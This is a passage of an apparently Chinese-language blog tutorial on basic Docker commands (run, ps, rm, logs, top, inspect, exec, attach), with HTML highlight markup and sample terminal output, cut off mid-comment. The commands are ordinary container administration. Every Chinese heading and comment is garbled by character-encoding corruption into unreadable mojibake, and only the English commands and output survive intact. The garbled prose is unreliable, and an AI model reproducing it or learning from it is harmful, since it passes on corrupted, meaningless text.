ç”¨æ¥åŒºåˆ†å®¹å™¨</span><br><span class="line">-d# åå°æ–¹å¼å¯åŠ¨</span><br><span class="line">-it# ä½¿ç”¨äº¤äº’æ–¹å¼è¿è¡Œï¼Œè¿›å…¥å®¹å™¨æŸ¥çœ‹å†…å®¹</span><br><span class="line">-p# æŒ‡å®šå®¹å™¨çš„ç«¯å£ -p 8080:8080</span><br><span class="line">-p ip:ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</span><br><span class="line">-p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ï¼ˆå¸¸ç”¨ï¼‰</span><br><span class="line">-p å®¹å™¨ç«¯å£</span><br><span class="line">å®¹å™¨ç«¯å£</span><br><span class="line">-P# éšæœºæŒ‡å®šç«¯å£</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æµ‹è¯•ï¼Œå¯åŠ¨å¹¶è¿›å…¥å®¹å™¨</span></span><br><span class="line">root@lemon-virtual-machine:/# docker run -it centos /bin/bash</span><br><span class="line">[root@901b12b8ffac /]# ls # æŸ¥çœ‹å®¹å™¨å†…çš„centos,åŸºç¡€ç‰ˆæœ¬ï¼Œå¾ˆå¤šå‘½ä»¤éƒ½æ˜¯ä¸å®Œå–„çš„ï¼</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä»å®¹å™¨ä¸­é€€å›ä¸»æœº</span></span><br><span class="line">[root@901b12b8ffac /]# exit</span><br><span class="line">exit</span><br><span class="line">root@lemon-virtual-machine:/# ls</span><br><span class="line">bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  swapfile  tmp  var</span><br><span class="line">boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr</span><br></pre></td></tr></table></figure><p><strong>åˆ—å‡ºæ‰€æœ‰çš„è¿è¡Œä¸­çš„å®¹å™¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker ps å‘½ä»¤</span></span><br><span class="line">   # åˆ—å‡ºå½“å‰æ­£åœ¨è¿è¡Œçš„çš„å®¹å™¨</span><br><span class="line">-a # åˆ—å‡ºå½“å‰æ­£åœ¨è¿è¡Œçš„çš„å®¹å™¨+å¸¦å‡ºå†å²è¿è¡Œçš„å®¹å™¨</span><br><span class="line">-n=?# æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å®¹å™¨</span><br><span class="line">-q# åªæ˜¾ç¤ºå®¹å™¨çš„ç¼–å·</span><br><span class="line"></span><br><span class="line">root@lemon-virtual-machine:/# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">root@lemon-virtual-machine:/# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND       CREATED         STATUS                          PORTS     NAMES</span><br><span class="line">901b12b8ffac   centos        &quot;/bin/bash&quot;   5 minutes ago   Exited (0) About a minute ago             sharp_saha</span><br><span class="line">684d99f91679   hello-world   &quot;/hello&quot;      23 hours ago    Exited (0) 23 hours ago                   festive_noeth</span><br></pre></td></tr></table></figure><p><strong>é€€å‡ºå®¹å™¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit# ç›´æ¥å®¹å™¨åœæ­¢å¹¶æ¨å‡º</span><br><span class="line">Ctrl + P + Q# å®¹å™¨ä¸åœæ­¢æ¨å‡º</span><br></pre></td></tr></table></figure><p><strong>åˆ é™¤å®¹å™¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm å®¹å™¨id# åˆ é™¤æŒ‡å®šçš„å®¹å™¨ï¼Œä¸èƒ½åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œå¦‚æœè¦å¼ºåˆ¶åˆ é™¤rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)# åˆ é™¤æ‰€æœ‰çš„å®¹å™¨</span><br><span class="line">docker ps -a -q | xargs docker rm# åˆ é™¤æ‰€æœ‰çš„å®¹å™¨</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨å’Œåœæ­¢å®¹å™¨çš„æ“ä½œ</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start å®¹å™¨id# å¯åŠ¨å®¹å™¨</span><br><span class="line">docker restart å®¹å™¨id# é‡å¯å®¹å™¨</span><br><span class="line">docker stop å®¹å™¨id# åœæ­¢å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker kill å®¹å™¨id# å¼ºåˆ¶åœæ­¢å½“å‰å®¹å™¨</span><br></pre></td></tr></table></figure><h2 id="å¸¸ç”¨çš„å…¶ä»–å‘½ä»¤"><a href="#å¸¸ç”¨çš„å…¶ä»–å‘½ä»¤" class="headerlink" title="å¸¸ç”¨çš„å…¶ä»–å‘½ä»¤"></a>å¸¸ç”¨çš„å…¶ä»–å‘½ä»¤</h2><p><strong>åå°å¯åŠ¨å®¹å™¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘½ä»¤ docker run -d é•œåƒå</span></span><br><span class="line">root@lemon-virtual-machine:/# docker run -d centos</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é—®é¢˜ docker psï¼Œå‘ç°centosåœæ­¢äº†</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¸¸è§çš„å‘ï¼Œdockerå®¹å™¨ä½¿ç”¨åå°è¿è¡Œï¼Œå°±å¿…é¡»æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ï¼Œdockerå‘ç°æ²¡æœ‰åº”ç”¨ï¼Œå°±ä¼šè‡ªåŠ¨åœæ­¢</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ—¥å¿—å‘½ä»¤</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -tf --tail å®¹å™¨</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ˜¾ç¤ºæ—¥å¿—</span></span><br><span class="line">-tf# æ˜¾ç¤ºæ—¥å¿—</span><br><span class="line">--tail number# è¦æ˜¾ç¤ºçš„æ—¥å¿—æ¡æ•°</span><br><span class="line">root@lemon-virtual-machine:/# docker logs -tf --tail 10 efc35b90e983</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å®¹å™¨ä¸­è¿‘ç¨‹ä¿¡æ¯</strong> ps</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘½ä»¤ docker top å®¹å™¨<span class="built_in">id</span></span></span><br><span class="line">root@lemon-virtual-machine:/# docker top e6f07538e8c5</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                6137                6117                0                   17:52               pts/0               00:00:00            /bin/bash</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹é•œåƒçš„å…ƒæ•°æ®</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘½ä»¤</span></span><br><span class="line">docker inspect å®¹å™¨id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æµ‹è¯•</span></span><br><span class="line">root@lemon-virtual-machine:/# docker inspect e6f07538e8c5</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2023-07-16T09:51:59.93652686Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/bin/bash&quot;,</span><br><span class="line">        &quot;Args&quot;: [],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 6137,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2023-07-16T09:52:00.159486535Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b/e6f07538e8c560a46ebc8c2669d5ea307483a97cdfaaf6abb1dc7b3dfe8acf5b-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/frosty_goldwasser&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;docker-default&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: null,</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: null,</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;&#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                36,</span><br><span class="line">                141</span><br><span class="line">            ],</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;CgroupnsMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: [],</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DeviceRequests&quot;: null,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: null,</span><br><span class="line">            &quot;PidsLimit&quot;: null,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0,</span><br><span class="line">            &quot;MaskedPaths&quot;: [</span><br><span class="line">                &quot;/proc/asound&quot;,</span><br><span class="line">                &quot;/proc/acpi&quot;,</span><br><span class="line">                &quot;/proc/kcore&quot;,</span><br><span class="line">                &quot;/proc/keys&quot;,</span><br><span class="line">                &quot;/proc/latency_stats&quot;,</span><br><span class="line">                &quot;/proc/timer_list&quot;,</span><br><span class="line">                &quot;/proc/timer_stats&quot;,</span><br><span class="line">                &quot;/proc/sched_debug&quot;,</span><br><span class="line">                &quot;/proc/scsi&quot;,</span><br><span class="line">                &quot;/sys/firmware&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReadonlyPaths&quot;: [</span><br><span class="line">                &quot;/proc/bus&quot;,</span><br><span class="line">                &quot;/proc/fs&quot;,</span><br><span class="line">                &quot;/proc/irq&quot;,</span><br><span class="line">                &quot;/proc/sys&quot;,</span><br><span class="line">                &quot;/proc/sysrq-trigger&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef-init/diff:/var/lib/docker/overlay2/8571a344881bf2c24077842c315b73805dfcfab1dc0ea87c2fc32f8fb60c05a5/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;e6f07538e8c5&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: true,</span><br><span class="line">            &quot;AttachStdout&quot;: true,</span><br><span class="line">            &quot;AttachStderr&quot;: true,</span><br><span class="line">            &quot;Tty&quot;: true,</span><br><span class="line">            &quot;OpenStdin&quot;: true,</span><br><span class="line">            &quot;StdinOnce&quot;: true,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;/bin/bash&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;centos&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;</span><br><span class="line">                &quot;org.label-schema.build-date&quot;: &quot;20210915&quot;,</span><br><span class="line">                &quot;org.label-schema.license&quot;: &quot;GPLv2&quot;,</span><br><span class="line">                &quot;org.label-schema.name&quot;: &quot;CentOS Base Image&quot;,</span><br><span class="line">                &quot;org.label-schema.schema-version&quot;: &quot;1.0&quot;,</span><br><span class="line">                &quot;org.label-schema.vendor&quot;: &quot;CentOS&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;898ddea5e68fc6ecc060e39bf199f3fb1604345cfb755eb1fdc4a4eb20951040&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;&#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/898ddea5e68f&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;c0a5e05462958270eff0b04f98e5da26d12116a2a7e7812cd91778af56e09742&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;65babaf968c065c92670e40836610c43f70520c4fd791b6def2ba131feb5fc00&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;c0a5e05462958270eff0b04f98e5da26d12116a2a7e7812cd91778af56e09742&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>è¿›å…¥å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æˆ‘ä»¬é€šå¸¸å®¹å™¨éƒ½æ˜¯åå°æ–¹å¼è¿ä½œçš„ï¼Œéœ€è¦è¿›å…¥å®¹å™¨ï¼Œä¿®æ”¹ä¸€äº›é…ç½®</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘½ä»¤</span></span><br><span class="line">docker exec -it å®¹å™¨id bashshell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æµ‹è¯•</span></span><br><span class="line">root@lemon-virtual-machine:/# docker exec -it e6f07538e8c5 /bin/bash</span><br><span class="line">[root@e6f07538e8c5 /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">[root@e6f07538e8c5 /]# ps -ef</span><br><span class="line">UID          PID    PPID  C STIME TTY          TIME CMD</span><br><span class="line">root           1       0  0 09:52 pts/0    00:00:00 /bin/bash</span><br><span class="line">root          15       0  0 10:04 pts/1    00:00:00 /bin/bash</span><br><span class="line">root          30      15  0 10:04 pts/1    00:00:00 ps -ef</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ–¹å¼äºŒ</span></span><br><span class="line">docker attach å®¹å™¨id</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æµ‹è¯•</span></span><br><span class="line">root@lemon-virtual-machine:/# docker attach e6f07538e8c5</span><br><span class="line">æ­£åœ¨æ‰§è¡Œå½“å‰çš„ä»£ç ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker <span class="built_in">exec</span><span class="comment"># è¿›å…¥å®¹å™¨åå¼€å¯ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œå¯ä»¥åœ¨é‡Œé¢æ“ä½œ 